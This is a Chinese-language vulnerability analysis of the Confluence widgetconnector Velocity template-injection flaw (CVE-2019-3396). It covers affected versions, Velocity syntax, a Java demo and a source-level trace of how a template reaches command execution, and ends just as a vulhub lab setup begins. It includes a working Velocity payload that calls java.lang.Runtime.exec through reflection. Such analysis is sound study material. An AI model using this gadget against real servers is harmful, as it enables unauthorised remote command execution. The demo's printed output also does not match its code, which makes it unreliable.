# 简介
Confluence Server和Confluence Data
Center的widgetconnector组件存在严重的安全漏洞，可以在不需要账号登陆的情况下进行未授权访问，精心构造恶意的JSON字符串发送给widgetconnector组件处理，可以进行任意文件读取、Velocity-SSTI远程执行任意命令。
影响版本：
  * 更早 -- 6.6.12（不包含）
  * 6.7.0 -- 6.12.3（不包含）
  * 6.13.0 -- 6.13.3（不包含）
  * 6.14.0 -- 6.14.3（不包含）
影响组件：
  * widgetconnector.jar 
        org.apache.velocity
        velocity
        1.7
## 基本语法
**语句标识符**
`#`用来标识Velocity的脚本语句，包括`#set`、`#if`
、`#else`、`#end`、`#foreach`、`#end`、`#include`、`#parse`、`#macro`等语句。
**变量**
`$`用来标识一个变量，比如模板文件中为`Hello $a`，可以获取通过上下文传递的`$a`
**声明**
`set`用于声明Velocity脚本变量，变量可以在脚本中声明
    #set($a ="velocity")
    #set($b=1)
    #set($arrayName=["1","2"])
**注释**
单行注释为`##`，多行注释为成对出现的`#* ............. *#`
**逻辑运算**
    == && || !
**条件语句**
以`if/else`为例：
    #if($foo1
    #elseif($foo==10)
        2
    #elseif($bar==6)
        3
    #else
        4
    #end
**单双引号**
单引号不解析引用内容，双引号解析引用内容，与PHP有几分相似
    #set ($var="aaaaa")
    '$var'  ## 结果为：$var
    "$var"  ## 结果为：aaaaa
**属性**
通过`.`操作符使用变量的内容，比如获取并调用`getClass()`
    #set($e="e")
    $e.getClass()
**转义字符**
如果`$a`已经被定义，但是又需要原样输出`$a`，可以试用`\`转义作为关键的`$`
## 基础使用
使用Velocity主要流程为：
  * 初始化Velocity模板引擎，包括模板路径、加载类型等
  * 创建用于存储预传递到模板文件的数据的上下文
  * 选择具体的模板文件，传递数据完成渲染
VelocityTest.java
    package Velocity;
    import org.apache.velocity.Template;
    import org.apache.velocity.VelocityContext;
    import org.apache.velocity.app.VelocityEngine;
    import java.io.StringWriter;
    public class VelocityTest {
        public static void main(String[] args) {
            VelocityEngine velocityEngine = new VelocityEngine();
            velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, "file");
            velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, "src/main/resources");
            velocityEngine.init();
            VelocityContext context = new VelocityContext();
            context.put("name", "Rai4over");
            context.put("project", "Velocity");
            Template template = velocityEngine.getTemplate("test.vm");
            StringWriter sw = new StringWriter();
            template.merge(context, sw);
            System.out.println("final output:" + sw);
        }
    }
模板文件`src/main/resources/test.vm`
    Hello World! The first velocity demo.
    Name is $name.
    Project is $project
输出结果：
    final output:
    Hello World! The first velocity demo.
    Name is Victor Zhang.
    Project is Velocity
    java.lang.UNIXProcess@12f40c25
通过`VelocityEngine`创建模板引擎，接着`velocityEngine.setProperty`设置模板路径`src/main/resources`、加载器类型为`file`，最后通过`velocityEngine.init()`完成引擎初始化。
通过`VelocityContext()`创建上下文变量，通过`put`添加模板中使用的变量到上下文。
通过`getTemplate`选择路径中具体的模板文件`test.vm`，创建`StringWriter`对象存储渲染结果，然后将上下文变量传入`template.merge`进行渲染。
## RCE
修改模板内容为恶意代码，通过`java.lang.Runtime`进行命令执行
    #set($e="e")
    $e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("touch /tmp/rai4over")
org.apache.velocity.app.VelocityEngine
引擎初始化时构造函数什么也没做，但是会调用`RuntimeInstance`，接着调用`setProperty`设置路径等参数。
org.apache.velocity.app.VelocityEngine#setProperty
`ri`就是前面的`RuntimeInstance`实例，跟进`setProperty`方法
org.apache.velocity.runtime.RuntimeInstance#setProperty
调用`setProperty(key, value)`设置键值对，最后引擎对象`init()`后为：
org.apache.velocity.VelocityContext#VelocityContext()
继续调用有构造参数
org.apache.velocity.VelocityContext#VelocityContext(java.util.Map,
org.apache.velocity.context.Context)
`this.context`被赋值为空的`HashMap()`，上下文变量创建完成。
org.apache.velocity.context.AbstractContext#put
调用`internalPut`函数
org.apache.velocity.VelocityContext#internalPut
调用`put`存入`hashMap`中，返回上层调用模板引擎对象`getTemplate`加载模板文件
org.apache.velocity.app.VelocityEngine#getTemplate(java.lang.String)
org.apache.velocity.runtime.RuntimeInstance#getTemplate(java.lang.String)
org.apache.velocity.runtime.RuntimeInstance#getTemplate(java.lang.String,
java.lang.String)
步步跟进套娃的`getTemplate`方法，然后调用`getResource`方法
org.apache.velocity.runtime.resource.ResourceManagerImpl#getResource(java.lang.String,
int, java.lang.String)
这里首先会使用资源文件名`test.vm`和资源类型`1`进行拼接为资源键名`1test.vm`，然后通过`get`方法判断`1test.vm`资源名是否在`ResourceManagerImpl`对象的`globalCache`缓存中，
org.apache.velocity.runtime.resource.ResourceCacheImpl#get
然后进一步判断`ResourceCacheImpl`对象的`cache`成员并返回判断结果。
如果资源`1test.vm`被缓存命中则直接加载，如果`globalCache`缓存获取失败则调用`loadResource`函数加载，加载成功后也同样会根据`1test.vm`资源键名放入`globalCache`以便下次查找。
org.apache.velocity.runtime.resource.ResourceManagerImpl#loadResource
根据资源名称、类型通过`createResource`生成资源加载器，然后调用`process()`从当前资源加载器集中加载资源。
org.apache.velocity.Template#process
    public boolean process()
            throws ResourceNotFoundException, ParseErrorException
        {
            data = null;
            InputStream is = null;
            errorCondition = null;
            /*
             *  first, try to get the stream from the loader
             */
            try
            {
                is = resourceLoader.getResourceStream(name);
            }
            catch( ResourceNotFoundException rnfe )
            {
                /*
                 *  remember and re-throw
                 */
                errorCondition = rnfe;
                throw rnfe;
            }
            /*
             *  if that worked, lets protect in case a loader impl
             *  forgets to throw a proper exception
             */
            if (is != null)
            {
                /*
                 *  now parse the template
                 */
                try
                {
                    BufferedReader br = new BufferedReader( new InputStreamReader( is, encoding ) );
                    data = rsvc.parse( br, name);
                    initDocument();
                    return true;
                }
`getResourceStream(name)`获取命名资源作为流，进行解析和初始化
最后将解析后的模板AST-node放入data中并层层返回，然后调用`template.merge`进行合并渲染。
org.apache.velocity.Template#merge(org.apache.velocity.context.Context,
java.io.Writer)
org.apache.velocity.Template#merge(org.apache.velocity.context.Context,
java.io.Writer, java.util.List)
这里是上面提到的`ASTprocess`类的`data`，并调用`render`进行渲染
org.apache.velocity.runtime.parser.node.SimpleNode#render
node通过层层解析，最终通过反射完成任恶意命令执行，整体的调用栈如下：
    exec:347, Runtime (java.lang)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    doInvoke:395, UberspectImpl$VelMethodImpl (org.apache.velocity.util.introspection)
    invoke:384, UberspectImpl$VelMethodImpl (org.apache.velocity.util.introspection)
    execute:173, ASTMethod (org.apache.velocity.runtime.parser.node)
    execute:280, ASTReference (org.apache.velocity.runtime.parser.node)
    render:369, ASTReference (org.apache.velocity.runtime.parser.node)
    render:342, SimpleNode (org.apache.velocity.runtime.parser.node)
    merge:356, Template (org.apache.velocity)
    merge:260, Template (org.apache.velocity)
    main:25, VelocityTest (Velocity)
# Confluence-SSTI
## 环境搭建
直接使用vulhub环境
    https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396
设置`docker-compose.yml`
    version: '2'